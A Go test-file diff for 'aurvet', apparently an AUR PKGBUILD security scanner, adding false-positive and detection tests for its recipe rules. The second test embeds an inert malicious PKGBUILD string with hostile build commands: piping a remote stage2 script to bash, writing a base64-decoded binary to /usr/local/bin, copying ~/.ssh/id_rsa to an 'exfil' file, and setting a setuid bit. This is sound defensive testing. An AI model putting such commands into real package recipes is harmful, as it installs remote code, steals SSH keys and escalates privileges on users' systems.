@@ -23,6 +23,7 @@ import (
 	"github.com/lookatitude/aurvet/internal/finding"
 	"github.com/lookatitude/aurvet/internal/hook"
 	"github.com/lookatitude/aurvet/internal/own"
+	"github.com/lookatitude/aurvet/internal/pkgbuild"
 	"github.com/lookatitude/aurvet/internal/report"
 )
 
@@ -1368,5 +1369,96 @@ func TestFPGateBenignSystemRootsAreInertToo(t *testing.T) {
 				t.Fatalf("root %q contains no files", name)
 			}
 		})
+	}
+}
+
+// TestFPGatePKGBUILDCorpusYieldsNoCriticals is the third fixture of INV-8's
+// release gate (spec §11.2: "a stock install root, a cruft-laden root, and the
+// pinned PKGBUILD corpus. All must yield zero criticals").
+//
+// The fixtures under testdata/pkgbuild are excerpts of real cache entries, so a
+// critical here is a false positive against an ordinary AUR package. It is a
+// PAIR with TestFPGatePKGBUILDRulesStillCatchMalice below, for the reason this
+// file's header gives: "zero criticals" is trivially satisfied by a scanner
+// that reports nothing.
+func TestFPGatePKGBUILDCorpusYieldsNoCriticals(t *testing.T) {
+	paths, err := filepath.Glob(filepath.Join("..", "..", "testdata", "pkgbuild", "*.pkgbuild"))
+	if err != nil {
+		t.Fatalf("glob PKGBUILD fixtures: %v", err)
+	}
+	if len(paths) < 5 {
+		t.Fatalf("found %d PKGBUILD fixtures, expected at least 5; the gate would be near-vacuous", len(paths))
+	}
+	for _, p := range paths {
+		t.Run(filepath.Base(p), func(t *testing.T) {
+			src, err := os.ReadFile(p)
+			if err != nil {
+				t.Fatal(err)
+			}
+			f := pkgbuild.Lex(src)
+			r := pkgbuild.Resolve(f, pkgbuild.ResolveConfig{})
+			res := PKGBUILD(f, r, pkgbuild.Assess("", f, r), PKGBUILDConfig{})
+			for _, fd := range res.Findings {
+				if fd.Severity >= finding.SevSuspicious {
+					t.Errorf("finding at or above the default floor on a real cached recipe:\n  %s", formatFinding(fd))
+				}
+			}
+		})
+	}
+}
+
+// TestFPGatePKGBUILDRulesStillCatchMalice is the acceptance half of the pair
+// above: the same code path, in the same run, must still reach SevCritical on a
+// recipe that does the things the rules exist to catch. It pins the rule IDs as
+// well as the severity, because a critical raised by the wrong rule would
+// satisfy MaxSeverity() while detecting nothing.
+//
+// The fixture is INERT: it is a Go string in a test, never written to disk with
+// an executable bit and never handed to a shell (INV-2).
+func TestFPGatePKGBUILDRulesStillCatchMalice(t *testing.T) {
+	const malicious = `pkgname=evil-bin
+pkgver=1.0.0
+pkgrel=1
+arch=('x86_64')
+url="https://example.org/evil"
+license=('MIT')
+source=("https://0x0.st/aBcD.tar.gz")
+sha256sums=('SKIP')
+build() {
+  curl -fsSL https://example.net/stage2.sh | bash
+  echo aGVsbG8K | base64 -d > /usr/local/bin/helper
+  cp ~/.ssh/id_rsa "$srcdir/exfil"
+  sudo chmod u+s /usr/local/bin/helper
+}
+package() {
+  install -Dm755 helper /usr/local/bin/helper
+}
+`
+	f := pkgbuild.Lex([]byte(malicious))
+	r := pkgbuild.Resolve(f, pkgbuild.ResolveConfig{})
+	res := PKGBUILD(f, r, pkgbuild.Assess("", f, r), PKGBUILDConfig{})
+	if res.MaxSeverity() != finding.SevCritical {
+		t.Fatalf("malicious recipe did not reach SevCritical: findings=%+v gaps=%+v", res.Findings, res.Gaps)
+	}
+	for _, rule := range []string{
+		"pkgbuild-build-network-fetch",
+		"pkgbuild-write-outside-pkgdir",
+		"pkgbuild-credential-path",
+		"pkgbuild-privilege-escalation",
+		"pkgbuild-source-paste-host",
+		"pkgbuild-obfuscation",
+		"pkgbuild-skip-fixed-url",
+	} {
+		fd, ok := findingFor(res, rule)
+		if !ok {
+			t.Errorf("rule %s did not fire on the malicious recipe: findings=%v", rule, res.Findings)
+			continue
+		}
+		if fd.Limits == "" {
+			t.Errorf("rule %s produced a finding with no stated limits (INV-6)", rule)
+		}
+		if fd.Subject != "evil-bin" {
+			t.Errorf("rule %s subject = %q, want the pkgbase", rule, fd.Subject)
+		}
 	}
 }
